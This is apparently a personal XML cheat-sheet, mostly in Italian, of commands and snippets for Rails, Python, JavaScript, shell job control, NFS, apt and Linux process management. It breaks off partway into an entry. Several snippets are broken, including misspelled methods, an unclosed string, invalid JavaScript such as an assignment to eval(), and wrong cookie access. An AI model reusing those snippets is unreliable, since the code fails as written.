<!--- ********************************** RAILS ***************************************** -->
<dict name="rails">
    <item name="install rails and heroku">
        Install rails app:<command name="rails new first_app"/>
        Best way to install an app (choose the dbms and delete the test folder):<command name="rails new first_app --database postgresql -T"/>
        To install the gems in Gemfile:<command name="bundle install"/>

        To execute the server:<command name="rails server"/>
        
        Deploying with heroku:
        *  Install heroku:<command name="gem install heroku"/>
        *  Create SSH Keys:<command name="ssh-keygen"/>
        *  Load keys to heroku:<command name="heroku keys:add"/>
        * Create the place to deploy:<command name="heroku  create"/>
        * Deployment to heroku:<command name="git push heroku master"/>
        * To open the browser with the right url:<command name="heroku open"/>

        Other stuff with heroku:
        *  Rename application:<command name="heroku rename other_app"/>

        Open the console without making any changing:<command name="rails console --sandbox"/>
    </item>
    <item name="generate code for model and controller">
        <command name="rails generate model User name:string email:string"/>
        Generate the Users controller with new action:<command name="rails generate controller Users new"/>
        <command name="rails integration_test layout_links"/>
        To create the files for rspec:<command name="rails generate rspec:install"/>

        Create a new empty migration:<command name="rails generate migration add_email_uniqueness_index"/>

        Generate the controller, route, model and view:<command name="rails generate scaffold User name:string email:string"/>
    </item>
    <item name="rake actions">
        <command name="rake db:migrate"/>
        <command name="rake db:create"/>
        Create a db test:<command name="rake db:test:prepare"/>
        Add a column to a model:<command name="rails generate migration add_password_to_users encrypt_password:string"/>
        Delete all the record from the dev db:<command name="rake db:reset"/>
    </item>
    <item name="ActiveRecord">
        Defining a model:
        <code>
            class Movie &lt; ActiveRecord::Base
            end

            # To create an ActiveRecord object
            movie = Movie.new(:title => 'Help', :rating => '5')
            # or
            movie = Movie.new
            movie.title = 'Help'; movie.rating = '5'
        </code>

        Create:
        <code>
            movie.save # or movie.save! but throw an exception
            movie.create # combines .new and .save
            # Ask if an object is not saved
            movie.id == nil 
            # or
            movie.new_record?==true
        </code>

        Read:
        <code>
            Movie.where("rating = '5'")
            Movie.where("release_date &lt; :cutoff and rating = :rating, 
            :rating => '5', :cutoff => '1.year.ago')

            Movie.find(3) # throw exception if not found
            Movie.find_by_id(3) # nil if not found

            # Auto generated methods
            Movie.find_all_by_rating('5')
            Movie.find_by_rating('5')

            # Get first, last and all
            Movie.first
            Movie.last
            Movie.all
        </code>

        Update:
        <code>
            m = Movie.find_by_title('Help')
            m.update_attributes(:release_date => '2011-Aug-10')
            # or
            m.relase_date = '2011-Aug-10'
            m.save

            # To get the original saved information use reload
            m.release_date = '23423'
            m.reload.relase_date  # it gives '2011-Aug-10'

        </code>

        Delete:
        <code>
            movie.destroy
        </code>

        Validation:
        <code>
            # in the model:
            vlaidates :name, :presence => true

            # Checks whether is valid according to the constraints
            m.valid?
            # and the errors
            m.errors.full_messages

        </code>
    </item>

    <item name="debugging">
        In view:
        <code>debug(@movie)
            @movie.inspect</code>
        or with ERB:
        <code>
            &lt;%= debug(params) if Rails.env.development? %&gt;
        </code>
        In controller:
        Use the logger:<code>logger.debug(@movie.inspect)</code>

        Debugger:
        Put "debugger" in controller code and then:
        <command name="rails server --debugger"/>
        That will stop the execution and open the debugger.
        To decide what environment use:<command name="rails server --environment production"/>
    </item>

    <item name="flash and session">
        flash[] persists up to the end of next request.
        <code>
            flash[:notice]     # for information
            flash[:warning]    # for errors
        </code>

        session[] persists forever. to reset the session reset_session.
        or<code>session.delete(:some_key)</code>
    </item>

</dict>


<!--- ********************************** PYTHON ***************************************** -->
<dict name="python">
<item name="PYTHONPATH">
Contiene i percorsi in cui Python va alla ricerca di moduli. A livello di codice si puo' intervenire alla variabile, per esempio aggiungendo nuovi percorsi tramite la lista:<code>sys.path</code>
</item>
<item name="pickle">
E' un modulo che consente di serializzare un oggetto in un file.
Il metodo dump(obj, file) serve a serializzare l'oggetto obj nel file.
Per caricare l'oggetto si invoca il metodo load

<code>
# x = [1, "asdfg"]
# f = open("/home/feel/prova", "w")
# pickle.dump(x, f)
# f = open("/home/feel/prova", "r")
# x = pickle.load(f)
</code>
</item>
<item name="Formattazione avanzata dell'output">
La funzione str() restituisce la rappresentazione del valore in termini umanamente comprensibili.
La funzione repr() genera la rappresentazione del valore comprensibile dall’interprete (mostrando per esempio \n o altri caratteri speciali)
La stampa in stile sprintf di C puo' essere fatta in tal modo:
<code>
print ’%2d %3d %4d’ % (x, x*x, x*x*x)
</code>
Dove i numeri 2,3,4 equivalgono all'allineamento a destra di una certa quantità. si usa %s per la conversione in stringa o %.3f per i float con 3 posizioni decimali.
Questo può essere fatto equivalentemente con:
<code>
print repr(x).rjust(2), repr(x*x).rjust(3), repr(x*x*x).rjust(4)

</code>
</item>
<item name="Operazioni su liste">
funzione <code>filter(func, seq)</code>): Restituisce una sequenza di elementi che soddisfano la funzione avente un parametro.

funzione<code>map(func, seq1, seq2,...)</code>: Restituisce una sequenza di elementi ottenuti da 'funzione' avente come parametri il generico elemento di ogni sequenza

funzione <code>reduce(func, seq, elemento_iniziale)"</code>: Restituisce un valore ottenuto tramite la funzione binaria partendo dall'elemento iniziale

funzione <code>sum(sequenza)</code>: Applica una somma sugli elementi

Esempi di costruzione di liste:
<code>
>>> vec = [2, 4, 6]
>>> [3*x for x in vec if x > 3]
[12, 18]


>>> vec1 = [2, 4, 6]
>>> vec2 = [4, 3, -9]
>>> [vec1[i]*vec2[i] for i in range(len(vec1))]
[8, 12, -54]
>>> [x+y for x in vec1 for y in vec2]
[6, 5, -7, 8, 7, -5, 10, 9, -3]

</code>


L'istruzione del consente di eliminare un elemento o porzioni in una lista o dizionario:
<code>
>>>del a[0]
>>>del a[2:4]
</code>
</item>

<item name="Operazioni su insiemi">
Due modi per costruire un insieme:
<code>
>>> frutta = set(['mela', 'pera', 'banana', 'mela'])
>>> frutta
set(['mela', 'pera', 'banana'])

>>> a = set(’abracadabra’)
>>> a
set([’a’, ’r’, ’b’, ’c’, ’d’])
</code>
Le operazioni sono le seguenti:
<code>
>>> a - b       # Operazione differenza
>>> a | b       # Operazione unione
>>> a &amp; b   # Operazione intersezione
>>> a ^ b       # Operazione equivalente a: (a | b) - (a &amp; b)
</code>
</item>
<item name="Tecniche sui cicli">
Per ricavare chiave e valore su un dizionario si usa i metodo iteritems():
<code>
>>> knights = {’gallahad’: ’the pure’, ’robin’: ’the brave’}
>>> for k, v in knights.iteritems():
...     print k, v
</code>

Per ricavare la coppia (indice, valore) si usa enumerate('list'):
<code>
>>> for i, v in enumerate([’tic’, ’tac’, ’toe’]):
...     print i, v
</code>
Per accoppiare due sequenze si usa zip():
<code>
>>> domande = [’nome’, ’scopo’, ’colore preferito’]
>>> risposte = [’lancillotto’, ’il santo graal’, ’il blu’]
>>> for q, a in zip(domande, risposte):
...     print ’Qual’e‘ il tuo %s? E‘ il %s.’ % (q, a)
Qual’e‘ il tuo nome? E‘ lancillotto.
Qual’e‘ il tuo scopo? E‘ il santo graal.
Qual’e‘ il tuo colore preferito? E‘ il blu.
</code>
Invertire il ciclo di una sequenza con reversed(seq):
<code>
>>> for i in reversed(xrange(1,10,2)):
...     print i
</code>
Ciclo di una sequenza ordinata con sorted(seq):
<code>
>>> basket = [’apple’, ’orange’, ’apple’, ’pear’, ’orange’, ’banana’]
>>> for f in sorted(set(basket)):
...     print f
</code>
Altri esempi interessanti:
<code>
for elemento in [1, 2, 3]:
print elemento
for elemento in (1, 2, 3):
print elemento
for chiave in {’uno’:1, ’due’:2}:
print chiave
for carattere in "123":
print carattere
for line in open("myfile.txt"):
print line
</code>
</item>
<item name="Iteratori e generatori">
E' semplice aggiungere un comportamento iteratore alle proprie classi, basta definire un metodo __iter__() che restituisca un oggetto con un metodo next():
<code>
>>> class Reverse:      # Iteratore per eseguire un ciclo al contrario su una sequenza
        def __init__(self, data):
            self.data = data
            self.index = len(data)
        def __iter__(self):
            return self
        def next(self):
            if self.index == 0:
                raise StopIteration
            self.index = self.index - 1
            return self.data[self.index]

>>> for carattere in Reverse(’spam’):
        print carattere
m
a
p
s
</code>
La stessa cosa può essere fatta in un solo metodo attrverso la parola chiave yield che automaticamente genera i metodi __iter__() e next():
<code>
>>> def reverse(data):
        for index in range(len(data)-1, -1, -1):
            yield data[index]

>>> for char in reverse(’golf’):
        print char
f
l
o
g
</code>
</item>
</dict>

<!--- ********************************** FONTCONFIG ***************************************** -->
<dict name="Fontconfig">

    <item name="fontconfig ">
        E' la nuova versione di gestione dei font di sistema (la versione X11 che utilizza xset e' deprecata).
        E' possibile aggiungere i propri font nella cartella home ~/.fonts/ oppure nella directory globale /usr/share/fonts/.
        Per la configurazione considerare i seguenti files:
        *   /etc/fonts/local.conf                           Per config globali
        *   ~/.fonts.conf o la directory ~/.fonts.conf.d/   Per config utente
        NOTA: Non modificare il file in /etc/fonts/fonts.conf
        NOTA!: Per rendere visibile il file di config utente aggiungere:
        <code><![CDATA[<!-- Load per-user customization file, but don't complain
            if it doesn't exist
            -->
            <include ignore_missing="yes">~/.fonts.conf</include>]]></code>
        Per visualizzare i font disponibili sul sistema:<command name="fc-list | sed 's,:.*,,' | sort -u"/>
        Per controllare i font presenti sulla cache (che facilità l'accesso ai font):<command name="fc-cache -vf"/>

</item>

</dict>

<!--- ********************************** JAVA ***************************************** -->
<dict name="Java">

<item name="update-java-alternatives -l">
lista delle jre installate

</item>

<item name="update-alternatives --config java">
consente di settare la jre di default

</item>

</dict>

<!--- ********************************** JAVASCRIPT ***************************************** -->
<dict name="JavaScript">

<item name="le funzioni built-in">
Le finestre di dialogo:
    Sono tutti metodi dell'oggetto window (window.alert() etc ...)
    Da un messaggio di allerta:<code>alert('Messaggio di allerta')</code>
    Da una finestra di dialogo restituendo true o false:<code>confirm('Sei sicuro di...?')</code>
    Ad esempio puo' essere adoperata nel caso si voglia segnalare qualcosa all'utente prima di aprire un link:<code><![CDATA[<a href="link.htm" onclick="return(confirm('Sei sicuro'))">]]></code>
    Il prompt è una finestra che domanda e consente all'utente di dare la risposta che vuole.<code> var nomeUtente=prompt("domanda","risposta predefinita");</code>
Aprire finestre personalizzate:<code>window.open('percorso_file_html','nome finestra','width=300,height=300 ,toolbar, location=no,status=,menubar=yes');</code>
    Vediamo nel dettaglio quali sono le principali caratteristiche che possono essere attribuite alla finestra:
    caratteristica	valore	    spiegazione	esempio

    width	        numerico	la larghezza della finestra in pixel	width=400
    height	        numerico	l'altezza della finestra in pixel	height=200
    left	        numerico	la distanza dalla sinistra del monitor	left=300
    top	                numerico	la distanza dal lato superiore del monitor	top=350
    resizable	        yes / no	indica se la finestra può essere ridimensionata o no	resizable=no
    fullscreen	        yes / no	indica se la finestra va aperta a tutto schermo	fullscreen=no
    channelmode	        yes / no	indica se la finestra deve essere aperta "in modalità canale" (solo per ie)	channelmode=no
    menubar	        yes / no	la barra del menu (quella con scritto "file", "modifica", ecc.)	menubar=no
    toolbar 	        yes / no	la barra degli strumenti del browser (con i pulsanti "indietro", "avanti")	toolbar=no
    location	        yes / no	la barra degli indirizzi del browser	location=no
    scrollbars	        yes / no	le barre di scorrimento laterali	scrollbars=no
    status	        yes / no	la barra di stato (quella in basso)	status=no


Javascript può elaborare sequenze escape anche all'interno dei propri script mediante i comandi escape:<code>escape("Ecco qui")</code>
diventa "Ecco%20qui" o con unescape per rendere la situazione contraria:<code>unescape("Ecco%20qui")</code> diventa "Ecco qui"


Per quanto riguarda la conversione di un valore contenuti in una variabile:
<code>
// Conversione numero->stringa
miastringa = String(num);
// Conversione stringa -> numero.Il secondo parametro indica la base numerica
parseInt("39 gradi", 10)==39 // Estrae il numero dalla stringa
// Conversione stringa -> numero in virgola mobile
parseFloat(38.4 gradi) == 38.4
// eval calcola espressioni numeriche
x=10; y=20; z=30; eval("x+y+z+900")=960;
</code>

Per verificare il tipo di una variabile si usa l'operatore typeof<code>
x=69;
typeof 69
</code>
Per controllare se una variabile non è un numero:<code>isNaN(variabile)</code>
indexOf: è un metodo delle stringhe e si utilizza per verificare se una determinata stringa contiene o meno una sottostringa.<code>indexOf(sotto_stringa)</code>Se la sottostringa cercata non c'è, il metodo restituisce -1


La Temporizzazione avviene tramite setTimeout() e setInterval(). Consentono rispettivamente di ritardare e ripetere una funzione, passata come primo parametro, di una quantità di millisecondi, passata come secondo parametro. Uno dei problemi è l'impossibilità di passare parametri a questa funzione ritardata rendendola di fatto poco usabile. Esiste una soluzione tramite le closure:
<code><![CDATA[
<script type="text/javascript">
var nameManager = function(name) {
  this.name = name;
   
  this.execute = function() {
    var manager = this;
     
    return function() {
      alert("parametro: " + manager.name + "\nthis.name: " + this.name);
    }
  }
}
 
var nm = new nameManager("Alberto");
 
window.onload = function() {
  window.setTimeout(nm.execute(), 1000);
}
</script>]]>
</code>

</item>

<item name="modi di esecuzione del codice"><![CDATA[
I modi per eseguire codice JavaScript sono:
   1. all'interno degli script, individuati dai tag <SCRIPT>, in maniera sequenziale, per cui l'esecuzione è automatica;
   2. caricandoli da file esterni;
   3. in seguito all'attivazione di un evento (handler) come un click del mouse o la pressione di un tasto (si vedranno in seguito gli eventi);
   4. in luogo di un link (a partire da Netscape 3.0) nella forma: <A href="Javascript:comando">
   5. valori Javascript possono essere richiamati dinamicamente dall'HTML includendoli tra i caratteri &amp;{ e };% ad esempio la larghezza di una tabella può essere ricavata in rapporto ad un valore javascript nella forma width="&amp;{barWidth};%"
]]>
</item>


<item name="gli eventi">
Il seguente codice mostra un rollover:<code><![CDATA[<A HREF="#" onmouseover="document.images[num].src='immagine.gif'" onmouseout=document.images[num].src='immagine1.gif'">]]></code>


Evento onchange su select:<code><![CDATA[<select name="prova" onchange="if(this.options[1].selected) alert('Hai selezionato il secondo'); else if(this.options[2].selected) alert('Hai selezionato il terzo') ">
<option selected="selected">primo</option>
<option>secondo</option>
<option>terzo</option>
</select>]]>
</code>


Questo esempio mostra il caricamento di immagini in successione. Sarebbe preferibile un timer che ci consenta per qualche secondo di mostrare l'immagine:
<code><![CDATA[
<script type="text/javascript">

var whichImage = 0;
var maxImages  = 5;

function changeAnimation(theImage)
{
  ++whichImage;
  
  if (whichImage < maxImages) {
    var imageName="numbers/number" + whichImage + ".jpg";
    theImage.src = imageName;
  }
  else { whichImage = -1; } 
}
</script>


<img id="changingAnimation" src="numbers/number0.jpg" 
     onLoad="changeAnimation(this)">]]>
</code>

Molto più spesso utilizziamo l'evento onLoad per essere sicuri di lanciare altri script solo al termine del caricamento della pagina:
<code><![CDATA[<script type="text/javascript">
function pageLoaded()
{
   // da fare alla fine del caricamento
}

windows.onload = pageLoaded;

</script>]]></code>


L'evento onError puo' essere usato per sopprimere i messaggi di errore che il debugger mostrerebbe oppure se il codice è espresso nella sezione <![CDATA[<head>]]>, diventa attivo per tutta la finestra e per tutti gli eventi di errore attivati dagli oggetti ivi contenuti
<code><![CDATA[
<img src="corrupt.gif" onError="null">
<head>
<script>window.onerror=null</script>
</head>]]>
</code>
</item>


<item name="gli oggetti">
Oggetto window e l'oggetto che rappresenta tutta la finestra. Eccco alcuni metodi:
<code><![CDATA[
win2 = window.open('','window2','scrollbars=yes');
try{
    win2.document.writeln('<strong>Error Report</strong> <p>');
    for (var i=0; i < msgArray.length; i++) {
       win2.document.writeln('<strong>Error in file:</strong> ' + urlArray[i] + '<br /> ');
       win2.document.writeln('<strong>Line number:</strong> ' + lnoArray[i] + '<br />');
       win2.document.writeln('<strong>Message:</strong> ' + msgArray[i] + '</p>');
    }
}
catch(e){
    alert(e.message)
}
finally{
    win2.document.close();
}]]>
</code>

Esiste anche la possibilità di recuperare dei dati contenuti nella finestra che ha aperto la finestra corrente in questo modo:<code>window.opener.nome_variabiles</code>

I frame di una window sono ottenuti così:<code>window.frames</code>
Il documento HTML è chiamato document. Per identificare un elemento nel documento:<code>document.getElementById</code>
Le form di un documento sono ottenute così:<code>document.forms['nome_form']</code>
Le immagini invece:<code>document.images['nome_immagine']</code>
I cookie:<code>document.cookie['nome_cookie']</code>
L'oggetto navigator è il browser
Le applet <code>document.applets["nome_applet"]</code>
La barra degli indirizzi <code>this.location.href='#'</code>.Questo ultimo esempio serve per ricaricare la pagina.
La barra di stato, nella parte bassa del browser <code>status</code>
Esiste l'oggetto history che contiene la storia della navigazione dell'utente per quel che riguarda una finestra. Ad esempio per tornare alla pagina precedente:<code><![CDATA[<a href="#" onClick="history.back()">torna indietro</a>]]></code>


I livelli sono ottenuti a partire dall'id. Supponiamo che esiste un livello di questo tipo:
<code><![CDATA[
<div id="mioLiv" style="position:absolute;background-color:red;color:white;">mio livello</div>]]>
</code>
Può essere nascosto attaverso il seguente metodo:
<code><![CDATA[
<script type="text/javascript">

function nascondi() {
  //document.all["mioLiv"].style.visibility="hidden";
  /*per Internet Explorer*/

  document.getElementById("mioLiv").style.visibility= "hidden";
  /*per IE 5/6 e NN 6*/
}
</script>]]>
</code>
E il metodo verrebbe richiamato così:<code><![CDATA[<a href="#" onclick="nascondi()">nascondi</a>]]></code>

Per conoscere la lunghezza di una casella di testo contenuta in una form:<code>document.mia_form.casella_testo.value.lenght</code>


Per conoscere informazioni sulla risoluzione dello schermo si usa screen:<code>screen.width; screen.height</code>


</item>


<item name="gli array">
Ecco un esempio di uso di array:<code>
alunni = new Array();
alunni["Mario"] = 5;
alunni[0]="Mario";</code>
Alcuni metodi sugli array:
Metodo o proprietà  	        Descrizione  	                
length 	                        Conoscere la lunghezza di un array 	
push(elemento) 	                Aggiungere un elemento in coda all’array e restituire la nuova lunghezza
concat (elementi da aggiungere) Aggiungere elementi ad un array e restituire la nuova lunghezza. Restituisce un nuovo array formato dalla somma degli elementi 	
pop() 	                        Eliminare un elemento dalla fine dell’array e restituisre il nome dell’elemento eliminato.
shift() 	                Eliminare un elemento dall’inizio dell’array e restituire il nome dell’elemento eliminato
reverse() 	                Invertire l’ordine degli elementi di un array
slice(inizio,fine)              Dividere l’array in un array più piccolo e restituire il nuovo array


</item>

<item name="passaggio di dati tra finestre">
Ci sono due casi:
1. di voler trasmettere i dati ad una finestra che viene aperta;
    La finestra chiamante ha per esempio questo script:<code><![CDATA[
    <script type="text/javascript">
    var tasto=null;
    </script>]]></code>
    La finestra chiamata ottiene il valore in questo modo:<code>window.opener.tasto</code>
2. di trasmettere i dati ad una pagina linkata.
    Si aggiungono dati al URL:<code><![CDATA[<a id="link" href="http://html.it/esempio28.html?" onclick="link.href+=tasto" target="_blank">I dati verranno ricevuti dalla pagina successiva</a>]]></code>
    La pagina chiamata legge il dato nel seguente modo:<code>var ausilio = String(this.location); var tasto = ausilio.charAt(ausilio.lastIndexOf("?")+1); </code>

</item>

<item name="il tag noscript">
Può capitare che javascript sia disabilitato nel browser. Per segnalare che la visualizzazione corretta della pagina necessita di javascript si usa il tag noscript:
<code>
<![CDATA[<noscript>
<div align="center">
  <h3><font face="Verdana,Arial,Helvetica,sans-serif">
    Per visualzzare correttamente il contenuto della
    pagina occorre avere JavaScript abilitato.
  </font></h3>
</div>
</noscript>]]>
</code>
</item>

<item name="oggetto Function e i metodi call() e apply()">
I metodi call() e apply() consentono l'esecuzione di una funzione definendo quale sarà lo scope (in maniera da definire chi è l'oggetto this) passandolo come primo parametro (può essere anche omesso nel caso si voglia solo l'esecuzione nel medesimo scope). La differenza tra apply() e call() è che apply() oltre all'oggetto scope accetta un vettore di parametri, mentre call() accetta un numero indefinito di parametri. Un esempio:
<code>
<![CDATA[<script type="text/javascript">

var persona = {
  nome: "Alberto",
  eta: 25
}
 
var cane = {
  nome: "Pluto",
  eta: 4
}
 
function stampaNomeEdEta(moltiplicatore) {
  alert(this.nome + ":\n" + (this.eta*moltiplicatore) + " anni");
}
 
 
// un anno di un cane corrisponde a sette anni uomo giusto??
stampaNomeEdEta.call(cane, 7);
</script>]]>
</code>
</item>

</dict>


<!--- ********************************** IPTABLES ***************************************** -->
<dict name="iptables">

<item name="iptables-save [-c] [-t table] &gt; /etc/iptables-save">
Serve per salvare l'insieme di regole (rule-set) all'interno di un file. -c serve a mantenere memorizzati i contatori dei byte e dei pacchetti. Qst opzione può servire quando occorre chiudere il firewall, in qst modo le info relative alle quantità di byte e pacchetti rimangono comunque memorizzate. -t indica quali tabelle memorizzare (nat, mangle, filter, raw) nel file se omesso memorizza tutte le tabelle nel file.

</item>

<item name="iptables-restore [-c] [-n] &lt; /etc/iptables-save">
Serve a caricare il file fornito da iptables-save nel kernel.  -c serve a mantenere memorizzati i contatori dei byte e dei pacchetti. Qst opzione può servire quando occorre chiudere il firewall, in qst modo le info relative alle quantità di byte e pacchetti rimangono comunque memorizzate.-n dice a iptables-restore di non sovrascrivere le regole precedenti. Di default le regole gia' esistenti vengono eliminate.

</item>

<item name="iptables [-t table] command [match] [target/jump] ">

</item>

</dict>

<!--- ********************************** NFS ***************************************** -->
<dict name="nfs">

<item name="LATO SERVER">
Pacchetti necessari:apt-get install nfs-kernel-server nfs-common portmap. PASSI DA FARE: 1) scrivere in /etc/exports i permessi (es /home/ 192.168.210.128/24(rw)) leggere il manuale (man exports). 2) Riavviare il server: /etc/init.d/nfs-kernel-server restart oppure con exportfs -a. 3) Per verificare l'esportazione showmount -e

</item>

<item name="LATO CLIENT">
Pacchetti necessari:apt-get install portmap nfs-common. PASSI DA FARE: mount 192.168.210.1:/home/ /mnt/HomeDiUbuntu 2) Se si vuole avviare al boot si modifica /etc/fstab cosi: 192.168.210.1:/home/ /mnt/HomeDiUbuntu nfs rsize=8192,wsize=8192,timeo=14,intr

</item>

</dict>

<!--- ********************************** MULTITASKING ***************************************** -->
<dict name="multitasking">

<item name="wait %job">
Arresta l'secuzione dello script finche' tutti i job in esecuzione in background non sono terminati, o finchè non è terminato il job o il processo il cui ID è stato passato come opzione

</item>

<item name="fg %job">
porta il processo in foreground

</item>

<item name="comando &amp; ">
il comando viene eseguito direttamente in background

</item>

<item name="bg %job">
fa girare in background un job sospeso

</item>

<item name="kill %job">
termina un job in background

</item>

<item name="jobs">
elenca i job presenti

</item>

<item name="ctrl+c e ctrl+z">
ctrl+c fa terminare il job corrente, ctrl+z fa sospendere il job corrente

</item>

</dict>

<!--- ********************************** REDIREZIONE I/O E PIPE DI COMUNICAZIONE***************************************** -->
<dict name="redirezione i/o e pipe di comunicazione">

<item name="comand1 ; comand2">
Il ; consente l'esecuzione sequenziale dei comandi
</item>

<item name="comand1 &amp;&amp; comand2">
Esegue comand2 solo se comand1 è stato eseguito con successo.
</item>

<item name="comand1 || comand2">
Esegue comand2 solo se comand1 ha generato un errore.
</item>

<item name="comand1 &amp; comand2 &amp; comand3">
Permette l'esecuzione simultanea..
</item>

<item name=":&gt; file opp &gt;file">

</item>


<item name="comando 1&gt;&gt;file">
redirige e accoda lo stdOut nel file &quot;file&quot;. 0=stdIn, 1=stdOut, 2=stdErr. &amp;&gt;&quot;file&quot; redirige stdErr e stdOut in &quot;file&quot;

</item>

<item name="comando 1&gt;/dev/null">
sopprime l'output

</item>


<item name="while read riga &lt;&amp;3 do {echo riga}">
legge le righe contenute nel file con descittore 3

</item>

</dict>

<!--- ********************************** APT ***************************************** -->
<dict name="apt">

<item name="apt-get [opt] comando">
-c=? legge come configurazione il file specificato(anziche' apt.conf), -d scarica pkg solamente e non installa, -s simula ma nn installa, -y applica si a tutte le domande, -m prova a continuare se gli archivi non ci sono, -V mostra i numeri di versione, -u mostra i pkg che stanno per essere aggiornati. Comandi: update aggiorna la lista dei pacchetti. update dovrebbe sempre essere fatto prima di un upgrade o dist-upgrade, upgrade esegue un aggiornamento, install istalla pkg, remove rimuove pkg, dist-upgrade aggiornamento della distrib. 

</item>

<item name="apt-cache [opt] comando">
-c=? legge come configurazione il file specificato(anziche' apt.conf), -a (è di default) stampa tutte le versioni disponibili. Comandi: search &quot;regex&quot; ricerca di pkg, depends &quot;pkg&quot; mostra le dipendenze di un pkg, showpkg &quot;pkg&quot; mostra info di un pkg, pkgnames &quot;prefix&quot; mostra il nome di un pkg.

</item>

</dict>

<!--- ********************************** GNOME ***************************************** -->
<dict name="gnome">

<item name="Gestione dell'ambiente desktop - gdm">
Per avviare l'ambiente desktop:
<command name="startx"/>  oppure <command name="init 5"/> oppure <command name="sudo /etc/init.d/gdm start"/>

Per chiudere l'ambiente si può usare Ctrl-Alt-Backspace oppure<command name="/etc/init.d/gdm stop"/>
o anche cambiare il runlevel<command name="/sbin/init 3"/>

</item>

<item name="import">
Consente di fare screenshot e salvarlo su un file.
Screenshot della finestra principale (root):<command name="import -window root ~/Scrivania/Screen_$(date '+%d%b%y-%N').png.png"/>
</item>
<item name="gnome-mount">
-d /dev/file specifica la partizione da montare sul mountpoint localizzato per default nella cartella /media. E' possibile cambiare mountpoint con l' opzione -m

</item>

<item name="gnome-terminal">
terminale di gnome. con l'opzione -e Ãš possibile eseguire un comando. Es. gnome-terminal -e &quot;sudo bash --rcfile /etc/profile&quot;

</item>


<item name="gconf-editor">
consente di gestire tuttoooo l'ambiente desktop. E' possile disabilitare la scrittura su disco (/desktop/gnome/lockdown/disable_save_to_disk)

</item>
<item name="autostart Avvio applicazioni">
La cartella su cui poter inserire file .desktop da avviare al boot e' ${HOME}/.config/autostart
</item>

</dict>

<!--- ********************************** PROCESSI MEMORIA COMANDI ***************************************** -->
<dict name="processi memoria comandi">

<item name="Codici del comando exit">
Una volta eseguito un comando può essere controllato lo stato d'uscita nel seguente modo:<command name="echo $?"/>Questo ci consente di prendere successive decisioni in merito al uscita del comando eseguito.
In generale ogni codice ha un suo significato:
    *      1: general errors
    *      2: misuse of shell builtins (pretty rare)
    *      126: cannot invoke requested command
    *      127: command not found error
    *      128: invalid argument to “exit”
    *      128+n: fatal error signal “n” (for example, kill -9 = 137).
    *      130: script terminated by Ctrl-C 
</item>

<item name="exec comando">
anziche generare un processo figlio per eseguire &quot;comando&quot;, con exec la shell e' sostituita dal comando. Se exec viene utilizzato in uno script qst termina all'esecuzione di exec

</item>
<item name="pidof">
Mostra il pid del processo passato come argomento:<command name="pidof processo"/>
</item>

<item name="ulimit -a">
mostra le limitazioni nelle risorse di sistema

</item>

<item name="top">
sorta di task manager in cui è possibile anche visualizzare la presenza di memoria swap. in X Server esiste un app simile premendo i tasti CTRL+Esc

</item>

<item name="free ">
visualizza l'utilizzo della memoria RAM e swap

</item>

<item name="insmod">
&quot;/lib/modules/2.2.17/sound/sound.o&quot; permette l'inserimento di moduli per la gestione di periferiche e di funzionalità nella memoria.Esiste la vecchia versione insmod.old. -f forza l'inserimento anche in caso di incompatibilità, -k rende flessibile la gestione del modulo.

</item>

<item name="lsmod /lib/modules/2.2.17/sound/sound.o">
Visualizza i moduli caricati in memoria. -c visualizza le configurazioni, -l lista, -r rimuove moduli
</item>

<item name="modprobe ">
carica moduli di memoria e li testa atraverso configurazioni. con l'opzione -l lista la posizione dei vari moduli

</item>

<item name="modinfo modulo">
mostra informazioni sul modulo.

</item>

<item name="rmmod">
rimuove un modulo in memoria. -a rimuove tutti i moduli

</item>

<item name="ps">
    Lists of the process in execution:<command name="ps -e"/>
    Shows with more details:<command name="ps aux"/>
    Shows all processes for the getty command with customied fields:<command name="ps -C getty -o user,pid,tty,time,comm"/>
    Shows the first 10 processes sorted by CPU usage:<command name="ps aux | sort -n -k 3 | tail -10"/>
    Shows the first 10 processes sorted by Memory usage:<command name="ps aux | sort -n -k 4 | tail -10"/>
visualizza ulteriori info sui processi attivi. si utilizzano le opzioni -afx, -a mostra i processi utilizzati da altri utenti, -f definisce una struttura ad albero, -x mostra  processi senza terminali di controllo, u rende l'output human-readble

</item>

<item name="pstree">
fornisce i processi con una struttura ad albero

</item>

<item name="kill">
uccide il processo &quot;pid&quot;<command name="kill pid"/>
Elenco dei segnali che possono essere mandati al processo<command name="kill -l"/>
I segnali più importanti sono: SIGHUP che consente di uccidere tutti i processi figli del processo specificato; SIGINT segnale di interruzione che corrisponde a Cntrl-C; SIGKILL; SIGTSTP che corrisponde a Cntrl-Z; SIGCONT che è il segnale inviato da una shell tramite i comandi fg e bg; SIGWINCH che è per eventi di finestra come resize e cosi via; e, infine SIGUSR1 e SIGUSR2 che permettono comunicazioni inter-processo.
</item>

<item name="trap">
Consente di catturare segnali inviati tramite il comando kill da un altro processo. La sintassi e':<command name="trap arg sig"/> Dove arg rappresenta una funzione da eseguire una volta ricevuto il segnale specificato. Se arg è : vuol dire che quel segnale viene ignorato dal processo. Mentre se arg è - viene ripristinato al valore iniziale nullo.
Ad esempio:
<code>
sigquit()
{
   echo "signal QUIT received"
}

sigint()
{
   echo "signal INT received, script ending"
   exit 0
}

trap 'sigquit' QUIT
trap 'sigint'  INT
trap ':'       HUP      # ignore the specified signals
echo "test script started. My PID is $$"
</code>
Su un'altra shell possiamo eseguire i seguenti comandi:<command name="kill -HUP  25309"/><command name="$ kill -QUIT 25309"/><command name="kill -INT  25309"/>
che verranno opportunamente gestiti tramite trap.

Allo stesso modo puoi consentire comunicazioni tra i processi.
<code>
config="our.config.file"
sigusr1()
{
  echo "(SIGUSR1: re-reading config file)"
  . $config
}

trap sigusr1 USR1       # catch -USR1 signal

echo "Daemon started. Assigned PID is $$"

</code>
Per far rileggere il file di configurazione basta fare:<command name="kill -USR1 25843"/>
</item>

<item name="batch -f file.sh">
esegue il file solo quando il carico della CPU scende (di 0.8 per default)

</item>

<item name="time">
    permette di dare info di tempo su un comando (time ls = lo esegue e da info).
    Utilizzare /usr/bin/uptime per ottenere maggiori informazioni.

</item>

<item name="nohup programma">
    permette di eseguire un programma in background e rimanendo eseguito anche quando ci si disconnette dal sistema andando a riportare l'output sul file nohup.out nella dir corrente.
    Vedere pure il comando <command name="disown"/>.


</item>

<item name="nice -n num programma">
permette di modificare la priorità di un processotra -20 (la più alta) a 19 (la più bassa)

</item>

<item name="watch -n num comando">
 Esegue un comando ripetutamente, ad intervalli di tempo specificati.Gli intervalli preimpostati sono di due secondi, ma questo valore puo essere modificato mediante l'opzione -n. es watch -n 5 tail /var/log/messages

</item>

<item name="man [sezione] pagina">
